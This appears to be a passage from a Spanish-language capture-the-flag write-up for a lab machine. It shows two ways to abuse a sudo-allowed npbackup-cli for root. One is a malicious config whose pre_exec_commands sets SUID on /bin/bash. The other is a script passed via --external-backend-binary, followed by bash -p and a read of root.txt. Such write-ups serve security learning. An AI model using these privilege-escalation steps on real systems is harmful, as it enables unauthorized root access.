  --quick-check         Deprecated in favor of --'check quick'. Quick check repository
  --full-check          Deprecated in favor of '--check full'. Full check repository (read all data)
  --check CHECK         Checks the repository. Valid arguments are 'quick' (metadata check) and 'full' (metadata + data check)
  --prune [PRUNE]       Prune data in repository, also accepts max parameter in order prune reclaiming maximum space
  --prune-max           Deprecated in favor of --prune max
  --unlock              Unlock repository
  --repair-index        Deprecated in favor of '--repair index'.Repair repo index
  --repair-packs REPAIR_PACKS
                        Deprecated in favor of '--repair packs'. Repair repo packs ids given by --repair-packs
  --repair-snapshots    Deprecated in favor of '--repair snapshots'.Repair repo snapshots
  --repair REPAIR       Repair the repository. Valid arguments are 'index', 'snapshots', or 'packs'
  --recover             Recover lost repo snapshots
  --list LIST           Show [blobs|packs|index|snapshots|keys|locks] objects
  --dump DUMP           Dump a specific file to stdout (full path given by --ls), use with --dump [file], add --snapshot-id to specify a snapshot other than latest
  --stats [STATS]       Get repository statistics. If snapshot id is given, only snapshot statistics will be shown. You may also pass "--mode raw-data" or "--mode debug" (with double quotes) to get full repo statistics
  --raw RAW             Run raw command against backend. Use with --raw "my raw backend command"
  --init                Manually initialize a repo (is done automatically on first backup)
  --has-recent-snapshot
                        Check if a recent snapshot exists
  --restore-includes RESTORE_INCLUDES
                        Restore only paths within include path, comma separated list accepted
  --snapshot-id SNAPSHOT_ID
                        Choose which snapshot to use. Defaults to latest
  --json                Run in JSON API mode. Nothing else than JSON will be printed to stdout
  --stdin               Backup using data from stdin input
  --stdin-filename STDIN_FILENAME
                        Alternate filename for stdin, defaults to 'stdin.data'
  -v, --verbose         Show verbose output
  -V, --version         Show program version
  --dry-run             Run operations in test mode, no actual modifications
  --no-cache            Run operations without cache
  --license             Show license
  --auto-upgrade        Auto upgrade NPBackup
  --log-file LOG_FILE   Optional path for logfile
  --show-config         Show full inherited configuration for current repo. Optionally you can set NPBACKUP_MANAGER_PASSWORD env variable for more details.
  --external-backend-binary EXTERNAL_BACKEND_BINARY
                        Full path to alternative external backend binary
  --group-operation GROUP_OPERATION
                        Deprecated command to launch operations on multiple repositories. Not needed anymore. Replaced by --repo-name x,y or --repo-group x,y
  --create-key CREATE_KEY
                        Create a new encryption key, requires a file path
  --create-backup-scheduled-task CREATE_BACKUP_SCHEDULED_TASK
                        Create a scheduled backup task, specify an argument interval via interval=minutes, or hour=hour,minute=minute for a daily task
  --create-housekeeping-scheduled-task CREATE_HOUSEKEEPING_SCHEDULED_TASK
                        Create a scheduled housekeeping task, specify hour=hour,minute=minute for a daily task
  --check-config-file   Check if config file is valid
```
---
#### Via Malicious Config

Dentro de nuestro directorio personal, nos encontramos con un archivo de configuración de `npbackup`. Este archivo tiene una estructura YAML y, entre las opciones disponibles, nos llama la atención `pre_exec_commands`.

Recordando que podemos indicar un archivo de configuración personalizado con la opción `-c`, y que ejecutamos el binario `npbackup-cli` con **sudo**, se abre una posibilidad: si indicamos un comando en esa sección, quizás podamos lograr que se ejecute con privilegios de **sudo** y ganar así acceso completo al sistema.

```sh
marco@codeparttwo:~$ ls -l
total 16
drwx------ 7 root  root  4096 Apr  6  2025 backups
-rw-rw-r-- 1 root  root  2893 Jun 18  2025 npbackup.conf
-rw-r----- 1 root  marco   33 Dec 18 06:29 user.txt

marco@codeparttwo:~$ cat npbackup.conf
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri:
      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
    repo_group: default_group
    backup_opts:
      paths:
      - /home/app/app/
      source_type: folder_list
      exclude_files_larger_than: 0.0
    repo_opts:
      repo_password:
        __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
      retention_policy: {}
      prune_max_unused: 0
    prometheus: {}
    env: {}
    is_protected: false
groups:
  default_group:
    backup_opts:
      paths: []
      source_type:
      stdin_from_command:
      stdin_filename:
      tags: []
      compression: auto
      use_fs_snapshot: true
      ignore_cloud_files: true
      one_file_system: false
      priority: low
      exclude_caches: true
      excludes_case_ignore: false
      exclude_files:
      - excludes/generic_excluded_extensions
      - excludes/generic_excludes
      - excludes/windows_excludes
      - excludes/linux_excludes
      exclude_patterns: []
      exclude_files_larger_than:
      additional_parameters:
      additional_backup_only_parameters:
      minimum_backup_size_error: 10 MiB
      pre_exec_commands: []
      pre_exec_per_command_timeout: 3600
      pre_exec_failure_is_fatal: false
      post_exec_commands: []
      post_exec_per_command_timeout: 3600
      post_exec_failure_is_fatal: false
      post_exec_execute_even_on_backup_error: true
      post_backup_housekeeping_percent_chance: 0
      post_backup_housekeeping_interval: 0
    repo_opts:
      repo_password:
      repo_password_command:
      minimum_backup_age: 1440
      upload_speed: 800 Mib
      download_speed: 0 Mib
      backend_connections: 0
      retention_policy:
        last: 3
        hourly: 72
        daily: 30
        weekly: 4
        monthly: 12
        yearly: 3
        tags: []
        keep_within: true
        group_by_host: true
        group_by_tags: true
        group_by_paths: false
        ntp_server:
      prune_max_unused: 0 B
      prune_max_repack_size:
    prometheus:
      backup_job: ${MACHINE_ID}
      group: ${MACHINE_GROUP}
    env:
      env_variables: {}
      encrypted_env_variables: {}
    is_protected: false
identity:
  machine_id: ${HOSTNAME}__blw0
  machine_group:
global_prometheus:
  metrics: false
  instance: ${MACHINE_ID}
  destination:
  http_username:
  http_password:
  additional_labels: {}
  no_cert_verify: false
global_options:
  auto_upgrade: false
  auto_upgrade_percent_chance: 5
  auto_upgrade_interval: 15
  auto_upgrade_server_url:
  auto_upgrade_server_username:
  auto_upgrade_server_password:
  auto_upgrade_host_identity: ${MACHINE_ID}
  auto_upgrade_group: ${MACHINE_GROUP}
```

Nuestra idea será hacer que `/bin/bash` se convierta en un binario SUID, para poder ejecutarlo con los privilegios de su propietario (`root`) y así ganar acceso a una shell con privilegios.

Para ello, modificamos esa sección `pre_exec_commands` y creamos un archivo de configuración malicioso en `/tmp/malicious.conf`, copiando el contenido del `npbackup.conf` original y añadiendo el comando `chmod u+s /bin/bash` en la lista correspondiente.

```sh
      pre_exec_commands:
      - chmod u+s /bin/bash
```

```sh
marco@codeparttwo:~$ cat /tmp/malicious.conf
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri:
      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
    repo_group: default_group
    backup_opts:
      paths:
      - /home/app/app/
      source_type: folder_list
      exclude_files_larger_than: 0.0
    repo_opts:
      repo_password:
        __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
      retention_policy: {}
      prune_max_unused: 0
    prometheus: {}
    env: {}
    is_protected: false
groups:
  default_group:
    backup_opts:
      paths: []
      source_type:
      stdin_from_command:
      stdin_filename:
      tags: []
      compression: auto
      use_fs_snapshot: true
      ignore_cloud_files: true
      one_file_system: false
      priority: low
      exclude_caches: true
      excludes_case_ignore: false
      exclude_files:
      - excludes/generic_excluded_extensions
      - excludes/generic_excludes
      - excludes/windows_excludes
      - excludes/linux_excludes
      exclude_patterns: []
      exclude_files_larger_than:
      additional_parameters:
      additional_backup_only_parameters:
      minimum_backup_size_error: 10 MiB
      pre_exec_commands:
      - chmod u+s /bin/bash
      pre_exec_per_command_timeout: 3600
      pre_exec_failure_is_fatal: false
      post_exec_commands: []
      post_exec_per_command_timeout: 3600
      post_exec_failure_is_fatal: false
      post_exec_execute_even_on_backup_error: true
      post_backup_housekeeping_percent_chance: 0
      post_backup_housekeeping_interval: 0
    repo_opts:
      repo_password:
      repo_password_command:
      minimum_backup_age: 1440
      upload_speed: 800 Mib
      download_speed: 0 Mib
      backend_connections: 0
      retention_policy:
        last: 3
        hourly: 72
        daily: 30
        weekly: 4
        monthly: 12
        yearly: 3
        tags: []
        keep_within: true
        group_by_host: true
        group_by_tags: true
        group_by_paths: false
        ntp_server:
      prune_max_unused: 0 B
      prune_max_repack_size:
    prometheus:
      backup_job: ${MACHINE_ID}
      group: ${MACHINE_GROUP}
    env:
      env_variables: {}
      encrypted_env_variables: {}
    is_protected: false
identity:
  machine_id: ${HOSTNAME}__blw0
  machine_group:
global_prometheus:
  metrics: false
  instance: ${MACHINE_ID}
  destination:
  http_username:
  http_password:
  additional_labels: {}
  no_cert_verify: false
global_options:
  auto_upgrade: false
  auto_upgrade_percent_chance: 5
  auto_upgrade_interval: 15
  auto_upgrade_server_url:
  auto_upgrade_server_username:
  auto_upgrade_server_password:
  auto_upgrade_host_identity: ${MACHINE_ID}
  auto_upgrade_group: ${MACHINE_GROUP}
```

Con el archivo de configuración malicioso listo, procedemos a ejecutar el binario con privilegios **sudo**, apuntando a nuestra configuración (`-c /tmp/malicious.conf`) y forzando una operación de backup (`-b -f`).

Los logs de la ejecución confirman que el comando se ejecutó con éxito: 

>"Pre-execution of command chmod u+s /bin/bash succeeded with: None".

```sh
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c /tmp/malicious.conf -b -f
2025-12-18 06:37:54,134 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-12-18 06:37:54,164 :: INFO :: Loaded config 3CF84341 in /tmp/malicious.conf
2025-12-18 06:37:54,179 :: INFO :: Running backup of ['/home/app/app/'] to repo default
2025-12-18 06:37:54,235 :: INFO :: Pre-execution of command chmod u+s /bin/bash succeeded with:
None
2025-12-18 06:37:55,398 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excluded_extensions
2025-12-18 06:37:55,398 :: ERROR :: Exclude file 'excludes/generic_excluded_extensions' not found
2025-12-18 06:37:55,399 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excludes
2025-12-18 06:37:55,399 :: ERROR :: Exclude file 'excludes/generic_excludes' not found
2025-12-18 06:37:55,399 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/windows_excludes
2025-12-18 06:37:55,399 :: ERROR :: Exclude file 'excludes/windows_excludes' not found
2025-12-18 06:37:55,399 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/linux_excludes
2025-12-18 06:37:55,399 :: ERROR :: Exclude file 'excludes/linux_excludes' not found
2025-12-18 06:37:55,399 :: WARNING :: Parameter --use-fs-snapshot was given, which is only compatible with Windows
using parent snapshot f89378c7

Files:           0 new,     0 changed,    12 unmodified
Dirs:            0 new,     0 changed,     9 unmodified
Added to the repository: 0 B   (0 B   stored)

processed 12 files, 48.965 KiB in 0:00
snapshot 70d894c7 saved
2025-12-18 06:37:56,581 :: INFO :: Backend finished with success
2025-12-18 06:37:56,584 :: INFO :: Processed 49.0 KiB of data
2025-12-18 06:37:56,584 :: ERROR :: Backup is smaller than configured minmium backup size
2025-12-18 06:37:56,585 :: ERROR :: Operation finished with failure
2025-12-18 06:37:56,585 :: INFO :: Runner took 2.407914 seconds for backup
2025-12-18 06:37:56,585 :: INFO :: Operation finished
2025-12-18 06:37:56,592 :: INFO :: ExecTime = 0:00:02.460753, finished, state is: errors.
```

Al verificar los permisos de `/bin/bash`, observamos que ahora tiene activado el bit SUID (`-rwsr-xr-x`). Finalmente, al ejecutar `/bin/bash -p` obtenemos una shell con privilegios de `root`, lo que nos permite leer la flag final `root.txt`.

```sh
marco@codeparttwo:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
marco@codeparttwo:~$ /bin/bash -p
bash-5.0# whoami
root
bash-5.0# cat /root/root.txt
e02fbac2e92d9ce5a39dcf59cc983aec
```
----
#### Via External Backend Binary option

A continuación, podemos utilizar el siguiente método alternativo para poder elevar nuestros privilegios como `root`.

Al inspeccionar el contenido del binario `/usr/local/bin/npbackup-cli`, se observa un bloque de código diseñado para restringir el uso de la opción `--external-backend-binary`. Sin embargo, esta restricción solo se activa si la flag está presente en `sys.argv` antes de que el script Python realice su procesamiento principal.

```sh
marco@codeparttwo:~$ cat /usr/local/bin/npbackup-cli
#!/usr/bin/python3
# -*- coding: utf-8 -*-
import re
import sys
from npbackup.__main__ import main
if __name__ == '__main__':
    # Block restricted flag
    if '--external-backend-binary' in sys.argv:
        print("Error: '--external-backend-binary' flag is restricted for use.")
        sys.exit(1)

    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
```

Por lo tanto, lo que realizaremos es crear un script en Bash que ejecute `chmod u+s /bin/bash` para convertir la `bash` con permisos de SUID y así poder obtener acceso como `root`. Daremos permisos de ejecución al script.

```sh
marco@codeparttwo:~$ cat /tmp/pwned
#!/bin/bash

chmod u+s /bin/bash
marco@codeparttwo:~$ chmod +x /tmp/pwned
```

Luego ejecutaremos el binario con sudo, forzando un backup y apuntando a nuestro script con `--external-backend-binary`. Aunque el comando falla al no ser un binario de restic válido, el error ocurre después de que nuestro script personalizado haya sido invocado e interpretado por el sistema.

```sh
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -b -c ~/npbackup.conf --external-backend-binary=/tmp/pwned
2025-12-18 06:42:45,447 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-12-18 06:42:45,475 :: INFO :: Loaded config 4E3B3BFD in /home/marco/npbackup.conf
2025-12-18 06:42:45,541 :: ERROR :: Runner: Function backup failed with: 'NoneType' object has no attribute 'strip'
2025-12-18 06:42:45,541 :: ERROR :: Trace:
Traceback (most recent call last):
  File "/usr/local/lib/python3.8/dist-packages/npbackup/core/runner.py", line 698, in wrapper
    return fn(self, *args, **kwargs)
  File "/usr/local/lib/python3.8/dist-packages/npbackup/core/runner.py", line 496, in wrapper
    result = fn(self, *args, **kwargs)
  File "/usr/local/lib/python3.8/dist-packages/npbackup/core/runner.py", line 674, in wrapper
    result = fn(self, *args, **kwargs)
  File "/usr/local/lib/python3.8/dist-packages/npbackup/core/runner.py", line 625, in wrapper
    return fn(self, *args, **kwargs)
  File "/usr/local/lib/python3.8/dist-packages/npbackup/core/runner.py", line 566, in wrapper
    return fn(self, *args, **kwargs)
  File "/usr/local/lib/python3.8/dist-packages/npbackup/core/runner.py", line 636, in wrapper
    result = self._apply_config_to_restic_runner()
  File "/usr/local/lib/python3.8/dist-packages/npbackup/core/runner.py", line 963, in _apply_config_to_restic_runner
    self.restic_runner.binary = self.binary
  File "/usr/local/lib/python3.8/dist-packages/npbackup/restic_wrapper/__init__.py", line 585, in binary
    version = self.binary_version
  File "/usr/local/lib/python3.8/dist-packages/npbackup/restic_wrapper/__init__.py", line 599, in binary_version
    return output.strip()
AttributeError: 'NoneType' object has no attribute 'strip'
2025-12-18 06:42:45,549 :: ERROR :: Cannot decode JSON from restic data: the JSON object must be str, bytes or bytearray, not bool
2025-12-18 06:42:45,549 :: ERROR :: Cannot find processed bytes: 'total_bytes_processed'
2025-12-18 06:42:45,549 :: ERROR :: Backend finished with errors.
2025-12-18 06:42:45,549 :: WARNING :: Cannot get exec time from environment
2025-12-18 06:42:45,549 :: ERROR :: Operation finished
2025-12-18 06:42:45,555 :: INFO :: ExecTime = 0:00:00.110782, finished, state is: errors.
```

Al verificar nuevamente los permisos de `/bin/bash`, verificamos los permisos de SUID. Finalmente, al ejecutar `bash -p` volvemos a obtener una shell con privilegios de `root`, lo que nos permite leer la flag final `root.txt`.

```sh
marco@codeparttwo:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash

marco@codeparttwo:~$ bash -p
bash-5.0# cat /root/root.txt
e02f********************3aec
```


> _Happy hacking :)_
